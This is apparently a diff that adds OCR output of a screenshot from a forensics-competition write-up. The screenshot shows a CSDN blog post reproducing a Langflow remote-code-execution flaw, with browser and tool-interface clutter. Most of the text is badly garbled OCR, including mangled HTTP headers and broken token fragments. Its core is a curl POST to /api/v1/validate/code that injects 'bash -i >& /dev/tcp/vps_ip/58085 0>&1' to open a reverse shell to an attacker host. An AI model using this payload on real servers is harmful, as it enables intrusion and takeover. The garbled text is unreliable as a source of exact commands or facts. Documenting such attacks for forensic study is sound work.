@@ -1,0 +1,149 @@
+# OCR: c7509b8b4c0695d804cc9f5bdf3d332c.webp
+# 来源: ./02-WriteUp/2025/2025-数证杯-决赛个人赛/c7509b8b4c0695d804cc9f5bdf3d332c.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 路由: chinese-or-general
+# 生成: 2026-11-03 14:29
+
+o 圆案件白文件
+区分析
+位置时间线 Q 搜素尊笔记
+自报告
+图研判
+鸟工具箱
+AI助手
+刷新个
+o
+文件全显签名恢复切换视图详情/预览
+C 口
+工作
+cSDn
+口托福
+博客
+压缩文件文档
+99
+8服多盟检材E01/立件分米
+https://blog.csdn.net/gg38733240/article/details/150939826
+口
+下载
+游戏学习
+视频社区
+模式上网2830
+小 Al-Generated Con...
+GGitCode
+Hexo部署到阿里云服务器ECS?2453 MacBook终端美化配置2326
+Linux安装VmwareToolstar解包时候出现
+InsCodeAl
+exitingwithfailurestatusduetoprevious errors1229
+DockerDesktopEngineAPl未授权访问漏
+洞复现[CVE-2025-9074]1196 大家在看
+基于OpenCV的绘图机器人系统设计@ 419
+ELK日志系统部署与优化 Java常用包有哪些985 嵌入式第二天01
+基于GCN的垃圾评论识别系统401 最新文章
+MacBookPro外接雕塑家便携扩展屏如何调整屏幕分辨率，解决图标字体模糊的问题
+huggingface下载数据集慢的解决办法
+DockerDesktopEngineAPl未授权访问漏洞复现[CVE-2025-9074]
+2025年6篇 2023年2篇 2020年2篇 2018年1篇
+2024年2篇 2022年2篇 2019年1篇
+10629 3124
+会议
+搜CSDN
+c-ch-wa-piatfernt-"wndn
+图
+Referer1-http://Localhost1786e/f1ows
+G0ogle-(hrone"sv-"139",-"Chrontun";v-"139”
+ses-ch-wa:-"lot;A-Brane";v-"99",
+Accept:-application/json,-text/plain,-*/*
+mebilet:70
+Sec-Fetch-Node: cor!
+wtherizatien:-tirarer.eyheGcioiiturtimilsEnnsccleTkpxvc9
+eylzdktioitapuiocQytyesnsiLTezcnktophyytwjkztenjyaorvitcbexsltjeivljzdl:Tivizhwljaxtiu2tzAztjksfo.
+sjtwncJzasoe-beionsvodtnv9ncliyuiscA_42Y c-Petch-Site:-same-origi
+accept-tncodine:gxip,doflate.br..zstd sccept-tanguage:-zhcn,zhgq=8.9
+oke
+sh tokeJ.
+eyzditsoiianuo
+yjheecio11ztnisimcct6pxcs
+NeSN31LTOZODktOOMYVNRTEM1TWOYLLCXTT1OLCNCEVCISIACCTSTCN1NEOANSe
+wiRzsu4-yqapxz.zt12esz1chiasnT3sgkzi05enkw)-access_toten_1f-ey3hb6c1os3Euninztss5cc161kpxvc9 ese
+ex8i1joaynjzxz1iMtzhjxhzi2azkao
+Nye5nn31LT@z00kto
+Sjbac3zaspe-nbespe5ivsdErv9ngliyuMis5ca_42rj-apikey_tkn_1fbx-Nonej-auto_lcgin.1f-loginj-sidebaristate-trve
+，Step3：通过代码验证接口获取反向Shell区
+10 12
+22 23
+"id";-84558d27-96bb-4389-88at-faec31426095",
+"sserane""-"adnin""perofile_inage"-rull, store_api_key":-rull,
+"is_saperuser":false,
+2025-08-27112:56:19.596595*
+FF
+updatedat..
+-2825-08-27113:137.105037*
+"tast_1ogin_at*;-*2025-05-27113:e:37.183245" atas*:
+"github_stared";-false,"dialog_dismtssed"-talse"discord_clickee"t-false
+Q搜索
+AI搜索
+利用/api/v1/validate/code接口的代码执行漏洞，发送经过身份验证的POST请求，执行恶意代码以建立反向Shell连接：
+python
+2 3
+bash 2 3 4 5 6 7 8
+POST GET
+回A/写代码
+1问复制
+D运行
+"code"："deffoo(p=import_('os').system(\"bash-c"bash-i>&/dev/tcp/vps_ip/580850>&1\"))
+回A写代码
+Curl-x'POST!
+"http://localhost:786o/api/vl/validate/code?x-api-key=langflow_api_key-H"accept:application/json1
+-H'x-api-key:langflow_api_key' Hcontent.Type:application/ison d
+包
+复制
+"code"："deffoo(p=import("'os""").system(\"bash-c"""bash-i>&/dev/tcp/vps_ip/58085
+/api/v1/custom_coaponent/updateCustomComponentUpdate/api/v1/configGetConfig
+Validate
+POST xyh4ck
+/api/v1/validate/code Post Validate Code
+★31
+关注
+1970-01-0101:00:0C
+总记录数80条
+1:1c
+28
+00 >
+Bo
+图分享
+专栏目录
+会员中心目录
+、漏洞信息 1.漏洞描述 2.影响范围
+在ng
+消息
+3.CVSS向量信息
+二、漏洞分析三、漏洞验证
+1.验证条件 2.验证步骤
+四、修复方案
+五、
+参考资料
+收起入
+中坤索 ☆
+图
+历史
+民 A
+创作中心
+上一篇：D-LinkDI-7400G+命令注入漏洞.. 下一篇：DockerDesktopEngineAPl未...
+分类专栏
+固件安全 web渗透内网渗透代码审计
+展开全部V
+1篇 3篇
+@
+口所有书签十创作
+大促甄选
+cSDn GO>
+L? 不
+MariaDB
+1
+跳至
+与
+X
+x
+SQ高级
+1
+页
